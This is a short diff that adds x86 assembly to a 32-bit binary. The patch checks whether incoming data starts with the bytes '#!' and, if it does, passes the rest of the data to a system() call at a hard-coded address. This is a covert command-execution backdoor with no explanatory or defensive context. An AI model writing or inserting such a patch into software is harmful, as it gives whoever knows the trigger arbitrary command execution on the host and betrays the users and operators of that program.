@@ -1,0 +1,22 @@
+jmp short 0x8048633
+
+mov eax, [ebp + dword ptr 8]
+mov dx, 0x2123
+cmp dx, [eax]
+je _IS_COMMAND
+
+_NOT_COMMAND:
+jmp short 0x8048639
+
+_IS_COMMAND:
+add eax, 2
+#push eax
+push ebp
+mov ebp,esp
+sub esp, 8
+sub esp, 0xC
+push eax
+mov edx, 0x8048460
+call edx #_system
+pop eax
+jmp 0x804864e
